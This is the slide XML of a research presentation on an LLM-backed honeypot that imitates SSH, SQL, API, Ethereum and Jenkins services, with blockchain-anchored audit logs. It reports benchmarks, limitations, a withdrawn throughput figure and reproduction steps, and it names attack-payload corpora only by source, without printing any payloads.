                <a:gridCol w="834431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Payloads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Provenance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ssh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1,862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SecLists command-injection corpus (commix-derived) + command-injection-payload-list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sql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474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SecLists SQLi corpus — generic, polyglot and sqlmap risk-classified boolean/error/time-based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api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136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PayloadsAllTheThings — prompt injection, SSRF, XXE, Log4Shell — plus SecLists XXE fuzzing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web3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Real Ethereum JSON-RPC methods per the published spec — the call itself is the attack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cicd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Real Jenkins remote-API endpoints and techniques from Jenkins security advisories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64608"/>
            <a:ext cx="10820095" cy="1234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0657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Why web3 and cicd are small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394960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Their real attack surface is a small, finite set of documented API methods and endpoints — not an open space of injection strings. Padding them to match ssh or sql would mean fabricating payloads instead of using real ones. Every entry carries a source field for provenance, and fetched corpora are cached locally so the generator still works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The tiering does what it was designed to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12098"/>
            <a:ext cx="5486400" cy="38532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ig2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740114"/>
            <a:ext cx="5230368" cy="35972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527048"/>
            <a:ext cx="2392527" cy="12344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37960" y="1527048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75704" y="1673352"/>
            <a:ext cx="202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D9488"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>0.8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2056810"/>
            <a:ext cx="202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Static path (mean)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5704" y="2294554"/>
            <a:ext cx="202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median 0.8 ms · n=30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13367" y="1527048"/>
            <a:ext cx="2392527" cy="12344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113367" y="1527048"/>
            <a:ext cx="50292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51111" y="1673352"/>
            <a:ext cx="202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B45309"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>2.33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1111" y="2056810"/>
            <a:ext cx="202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Model path (mean)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1111" y="2294554"/>
            <a:ext cx="202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median 1.73 s · n=20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35808"/>
            <a:ext cx="4876495" cy="48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Three orders of magnitude apart. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The static table answers in 0.8 ms; the model path averages 2.33 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41140"/>
            <a:ext cx="4876495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Median well below mean. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>1.73 s versus 2.33 s — the distribution has a long right tail (max 5.92 s), typical of a hosted API under variable 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462272"/>
            <a:ext cx="4876495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Why it still works. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The commands an attacker types first are exactly the ones in the static table, so the slow path is hit only once the session is already committed.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Honest numbers, including the ones that are not flattering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29930"/>
            <a:ext cx="5394960" cy="381759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ig3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757946"/>
            <a:ext cx="5138928" cy="356156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572768"/>
          <a:ext cx="5059374" cy="2286000"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1"/>
              <a:tblGrid>
                <a:gridCol w="3140301"/>
                <a:gridCol w="1919073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Throughput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Static fast path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1,250 req/s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Model path, sequential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0.43 req/s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Model path, 10 concurrent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1.61 req/s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Per-request latency at that concurrency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2.19 s mean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3995928"/>
            <a:ext cx="5059375" cy="201168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2E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0" y="41970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B45309"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>A bug we found and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526280"/>
            <a:ext cx="46021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An earlier revision of this work reported ~800 req/s under concurrency. That figure was wrong: the concurrency benchmark reused payloads the diversity pass had already sent, so every request was a Redis cache hit and the number measured cache round-trip, not model throughput.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="118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</a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="118000"/>
              </a:lnSpc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The fix appends a fresh UUID to each payload immediately before firing. All prior concurrent-throughput figures are withdrawn; the numbers above are the corrected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Response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Resistance to signature-based fingerprinting, per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6430"/>
            <a:ext cx="5394960" cy="392459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ig4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704446"/>
            <a:ext cx="5138928" cy="366856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572768"/>
          <a:ext cx="5059374" cy="2414016"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1"/>
              <a:tblGrid>
                <a:gridCol w="1308459"/>
                <a:gridCol w="1308459"/>
                <a:gridCol w="1221228"/>
                <a:gridCol w="122122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Payloads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Distinct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Unique</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="100584" marR="73152" marT="27432" marB="27432" anchor="ctr"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ssh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1,862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1,681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90.3%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sql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474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470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99.2%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api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136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87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64.0%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web3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94.4%</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="100584" marR="73152" marT="27432" marB="27432" anchor="ctr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cicd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90.0%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46520" y="4133087"/>
            <a:ext cx="4967935" cy="48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SQL is near-perfect. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>99.2% distinct across 474 real injection payloads.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738420"/>
            <a:ext cx="4967935" cy="486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SSH holds up at scale. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>90.3% distinct across 1,862 payloads — the largest slice by far.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343753"/>
            <a:ext cx="4967935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▪   </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>API is the weak point. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>64%. Raw XXE and JNDI payloads collapse into a generic error reply. This is the clearest actionable finding in the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Scored by an independent meta-llama/llama-3.1-70b-instruct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66529"/>
            <a:ext cx="5394960" cy="39443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ig5_real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694545"/>
            <a:ext cx="5138928" cy="36883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27048"/>
            <a:ext cx="4967935" cy="1188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46520" y="1527048"/>
            <a:ext cx="50292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84264" y="1673352"/>
            <a:ext cx="4602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4F46E5"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>4.37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264" y="2071558"/>
            <a:ext cx="4602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Mean realism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2309302"/>
            <a:ext cx="4602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σ = 1.45 over 30 judged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44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Score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1012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7C8AA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3355848"/>
            <a:ext cx="3870655" cy="164592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12280" y="3355848"/>
            <a:ext cx="3225546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820095" y="331012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7C8AA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703320"/>
            <a:ext cx="3870655" cy="164592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820095" y="36576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7C8AA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4050791"/>
            <a:ext cx="3870655" cy="164592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820095" y="40050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5254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7C8AA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4398264"/>
            <a:ext cx="3870655" cy="164592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12280" y="4398264"/>
            <a:ext cx="129021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820095" y="435254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00016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7C8AA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4745736"/>
            <a:ext cx="3870655" cy="164592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12280" y="4745736"/>
            <a:ext cx="516087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820095" y="470001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84648"/>
            <a:ext cx="49679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Bimodal, not uniform: 25 of 30 responses are judged indistinguishable from real output, while 5 fail outright — and those failures cluster on the api service's XXE and JNDI payloads. The mean hides that; the distribution does not.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Blockchain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300 anchors measured against the live stack — Ganache v7.9.2, chain 1337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50292" cy="12984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81051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4F46E5"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>10.79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6447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Mean anchor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0221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median 10.23 · p95 12.74 · p99 21.65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7362" y="166420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7362" y="1664208"/>
            <a:ext cx="50292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5106" y="181051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0D9488"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>0.0063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106" y="216447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Baseline SHA-256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106" y="240221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hashing is effectively free; the chain write is the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8924" y="166420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08924" y="1664208"/>
            <a:ext cx="50292" cy="12984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46668" y="181051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B45309"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>21,511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6668" y="216447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Gas per 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6668" y="240221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range 21,488–21,512 · 4.30e-05 ETH at 2 gwei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2724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3127248"/>
            <a:ext cx="50292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3544" y="327355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0D9488"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>300 / 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362751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Anchoring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386525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100% — every event committed on-chain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7362" y="312724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47362" y="3127248"/>
            <a:ext cx="50292" cy="12984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85106" y="327355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4F46E5"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>92.65 / 148.96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5106" y="362751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Events/s sequential / concurrent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06" y="386525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at concurrency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8924" y="3127248"/>
            <a:ext cx="3496970" cy="129844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008924" y="3127248"/>
            <a:ext cx="50292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46668" y="3273552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0D9488"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>500 / 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6668" y="3627513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F172A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Tamper trials detected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3865257"/>
            <a:ext cx="3131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000" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="7C8AA0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>100% detection, 0 false positives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72744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0F172A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Gas is flat at the 21,000-unit base-transaction floor: the digest rides in the transaction's input data, so anchoring cost does not grow with the size of the record being protected.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Blockchain results in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43536"/>
            <a:ext cx="3454298" cy="26874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i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071552"/>
            <a:ext cx="3198266" cy="24314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8463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1">
                <a:solidFill>
                  <a:srgbClr val="7C8AA0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Anchor latency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936385"/>
            <a:ext cx="3454298" cy="27017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ig_g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714" y="2064401"/>
            <a:ext cx="3198266" cy="24457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698" y="48463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1">
                <a:solidFill>
                  <a:srgbClr val="7C8AA0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Gas consumed per anchor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1596" y="1936385"/>
            <a:ext cx="3454298" cy="27017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_tam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612" y="2064401"/>
            <a:ext cx="3198266" cy="24457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51596" y="484632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1">
                <a:solidFill>
                  <a:srgbClr val="7C8AA0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Tamper-detection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All three charts are generated directly from blockchain_results.json, which is written by benchmark_blockchain.py running against the live Ganache + FastAPI + Redis stack. No value in this deck was typed by hand.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The optimisation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Three changes, measured before and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10545775" cy="315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4F46E5"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>▪   </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1450" b="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Connection pooling. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1450">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>A persistent HTTP session to the model API, removing per-call TLS handshake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0140"/>
            <a:ext cx="10545775" cy="315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4F46E5"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>▪   </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1450" b="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Tuned generation length. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1450">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Shorter maximum output — terminal text is terse, and short generations return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24632"/>
            <a:ext cx="10545775" cy="315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4F46E5"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>▪   </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1450" b="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Widened static dictionary. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1450">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>More common commands answered at tier 1, so fewer sessions reach the model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10128"/>
            <a:ext cx="5272887" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEFBF7"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="C8E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D9488"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>≈ 3×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on the model-backed path, measured before and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3310128"/>
            <a:ext cx="5272887" cy="14173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2E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7327" y="35478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B45309"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>at a small realism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005072"/>
            <a:ext cx="46785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334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Shorter responses score marginally lower with the judge. Reported rather than hidden — the trade is deliberate and documented in BENCHMARK_REPORT.md.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0176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0" i="1">
                <a:solidFill>
                  <a:srgbClr val="7C8AA0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>The same report also documents the withdrawn concurrency figure. Recording a benchmark that got worse, and a number that turned out to be wrong, is part of the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Positioning against prior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18596" y="1435607"/>
            <a:ext cx="7554501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tab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12" y="1563624"/>
            <a:ext cx="7298469" cy="1892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11004" y="3630168"/>
            <a:ext cx="6569686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20" y="3758184"/>
            <a:ext cx="6313654" cy="20299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0" i="1">
                <a:solidFill>
                  <a:srgbClr val="7C8AA0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Top: deception capability against comparable honeypot systems.   ·   Bottom: tamper-evidence properties against prior log-integrity approaches.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7600" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="3B456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4670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Limitations &amp; honest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450" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="9FABC4"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>What these numbers do not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What this evaluation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0545775" cy="783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Ganache mines instantly. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>The 10.79 ms anchor latency contains no public-network confirmation wait. The contribution is the pipeline, the threat model and the 100% tamper detection — all of which transfer unchanged to a batched public or permissioned deployment, where anchoring cost is amortised over many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9143"/>
            <a:ext cx="10545775" cy="540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The judge is a model, not a person. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Realism is scored by a second language model. It is a reproducible proxy metric; it is not a human-subject study, and a skilled human analyst may well detect the decoy where the judge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45586"/>
            <a:ext cx="10545775" cy="783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No live attacker traffic was captured. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Everything reported here was measured against a real-payload corpus in a lab. Exposing decoy ports to the internet is a deliberate operational decision, with legal and provider-policy implications, and was intentionally left to whoever deploys the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84801"/>
            <a:ext cx="10545775" cy="540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Classification is keyword-based. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Fast and explainable, but obfuscated or encoded payloads land in unknown rather than a specific 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81244"/>
            <a:ext cx="10545775" cy="540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4F46E5"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>▪   </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350" b="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Concurrency is limited by the hosted API. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1350">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>At 10 concurrent sessions the system sustains 1.61 req/s on the model path — an upstream API constraint, not a design ceiling of the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Research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Two distinct IEEE-format papers, both built from measured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27288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5272887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F172A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Paper 2 — Deception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250" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="7C8AA0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>AI-driven multi-service deception with a tiered response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Source of numbers: evaluation_results.json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79774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2,500 real payloads across five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60317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Realism 4.37/5 · SQL diversity 99.2%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40860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IEEEtran LaTeX + DOCX + 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64208"/>
            <a:ext cx="5272887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664208"/>
            <a:ext cx="5272887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07327" y="1938528"/>
            <a:ext cx="4724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F172A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Paper 3 — Tamper-evidence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322576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250" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="7C8AA0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Blockchain-anchored audit trail for honeypot forensics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999232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Source of numbers: blockchain_results.json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379774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300 anchors · 500 tamper trials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760317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Anchor 10.79 ms · detection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4140860"/>
            <a:ext cx="4632807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7 pages, compiles clean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10328"/>
            <a:ext cx="10820095" cy="10515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5138928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defRPr sz="1250" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>The two papers share ≈1% 6-gram overlap — confined to the author list and shared citations — so they are genuinely separate contributions rather than one result split in two. Both rebuild end to end from the raw JSON: re-run the benchmark and every figure, table and in-text number refreshes consistently.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2567863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41832" y="2212848"/>
            <a:ext cx="21106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Deception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15768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Python asyncio + aiohttp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151174"/>
            <a:ext cx="2064943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asyncssh — real SSH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93388"/>
            <a:ext cx="2064943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FastAPI — four HTTP decoys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6543" y="1938528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36543" y="1938528"/>
            <a:ext cx="2567863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92575" y="2212848"/>
            <a:ext cx="21106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2575" y="2715768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OpenRouter hosted LLM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575" y="3151174"/>
            <a:ext cx="2064943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meta-llama/llama-3.1-8b-instruct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2575" y="3793388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Redis response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938528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87287" y="1938528"/>
            <a:ext cx="2567863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3319" y="2212848"/>
            <a:ext cx="21106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Evidence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15768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SHA-256 canonical hashing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151174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Web3.py + Ganache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3586581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D9488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Redis record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8031" y="1938528"/>
            <a:ext cx="2567863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38031" y="1938528"/>
            <a:ext cx="2567863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4063" y="2212848"/>
            <a:ext cx="21106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063" y="2715768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React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3" y="3151174"/>
            <a:ext cx="2064943" cy="261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WebSocket live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3586581"/>
            <a:ext cx="2064943" cy="4684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4F46E5"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>▪   </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1150" b="0">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Docker Compose — 10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68172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0" i="0">
                <a:solidFill>
                  <a:srgbClr val="7C8AA0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Evaluation and paper toolchain:  evaluate.py · benchmark_blockchain.py · generate_dataset.py · matplotlib figures · headless-Chrome diagram rendering · IEEEtran LaTeX via tectonic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Reproducing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11338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7C8AA0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Every artefact in this deck rebuilds from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9928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19656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86994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865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Bring the stack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79092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docker compose up --build   —   ten containers on honeypot-net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18004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2427732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47802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47345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Rebuild the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87168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python3 generate_dataset.py   —   refetches real payload corpora (cached offline)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3035808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086100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30815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Run the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95244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python3 evaluate.py   —&gt;   evaluation_results.json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34156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68680" y="3643884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369417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36896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Run the chain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03320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python3 benchmark_blockchain.py   —&gt;   blockchain_results.json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42232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8680" y="4251960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430225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4297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Verify integrity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11396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python3 verify_integrity.py   —   re-hash, compare on-chain, show a tampered copy diverging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50308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68680" y="4860036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8680" y="491032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2456" y="490575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Rebuild the papers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919472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generate_figures.py · build_tables.py · render.py · build_latex.py · tectonic paper.tex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358384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68680" y="5468112"/>
            <a:ext cx="329184" cy="32918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8680" y="5518404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2456" y="55138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0F172A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Rebuild this deck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27548"/>
            <a:ext cx="693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34155"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>presentation/build_ppt.py   —   reads the same JSON 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094476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00" b="0" i="1">
                <a:solidFill>
                  <a:srgbClr val="7C8AA0"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Nothing in the papers or this deck is hand-typed: re-running the benchmarks refreshes every figure, table and in-text number consistently.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09928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709928"/>
            <a:ext cx="45720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Fix the api decoy's weak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37944"/>
            <a:ext cx="6293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Add XML-parser and JNDI-aware exemplars to the oracle-ai system prompt, then re-measure diversity — currently 64%, the lowest of the five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9464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2569464"/>
            <a:ext cx="45720" cy="7863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6883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Batch anchoring on a public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97480"/>
            <a:ext cx="6293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Commit a Merkle root over N records per transaction. Preserves per-record tamper-evidence while amortising confirmation latency and cost — the natural path from Ganache to a real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45720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5478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Learned intent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57016"/>
            <a:ext cx="6293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Replace keyword matching for the obfuscated and encoded payloads that currently fall into unknown, while keeping the fast path deterministic.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88536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4288536"/>
            <a:ext cx="45720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44074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Controlled live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416551"/>
            <a:ext cx="6293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Run on an isolated cloud VM with budget caps on the model API and the dashboard behind access control, to complement the real-payload corpus with organic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48071"/>
            <a:ext cx="1082009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5148071"/>
            <a:ext cx="45720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5266943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Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Human-analyst realism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276087"/>
            <a:ext cx="6293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334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Replace the model judge with expert reviewers to validate the 4.37/5 proxy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68580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05256" y="402336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4F46E5"/>
                </a:solidFill>
                <a:latin typeface="Arial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658368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0F172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A honeypot that stays believable. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Model-generated responses scored 4.37/5 by an independent judge, with up to 99.2% distinct outputs across 2,500 real attack payloads — the fingerprint that gives static honeypots away is no longer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61513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Deployable, not just plausible. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Tiering keeps routine traffic on a 0.8 ms path and reserves the model for genuinely novel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5939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Evidence that survives compromise. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>300/300 events anchored, 500/500 tamper attempts detected with 0 false positives, at 21,511 gas and 0.0046 ms to verify.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0364"/>
            <a:ext cx="10545775" cy="5583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▪   </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Measured, not asserted. </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="334155"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Every figure comes from a live run against the real stack, with the weak results — the api decoy, the withdrawn throughput number, the instant-mining caveat — reported alongside the strong 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532120"/>
            <a:ext cx="10820095" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5000"/>
            </a:avLst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5760720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AI deception + multi-service coverage + tamper-evident evidence — combined, measured end to end, and written up as two IEEE papers.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7C8AA0"/>
                </a:solidFill>
                <a:latin typeface="Arial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52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520440"/>
            <a:ext cx="201168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0" i="0">
                <a:solidFill>
                  <a:srgbClr val="9FABC4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defRPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="7A87A3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Code · papers · benchmarks:  CODE/  ·  CODE/paper2/  ·  CODE/paper3/</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPct val="140000"/>
              </a:lnSpc>
              <a:defRPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="7A87A3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Raw results:  evaluation_results.json  ·  blockchain_results.json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3737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AI-Driven Cyber Deception &amp; Attack Detection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373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0" i="0">
                <a:solidFill>
                  <a:srgbClr val="55607A"/>
                </a:solidFill>
                <a:latin typeface="Arial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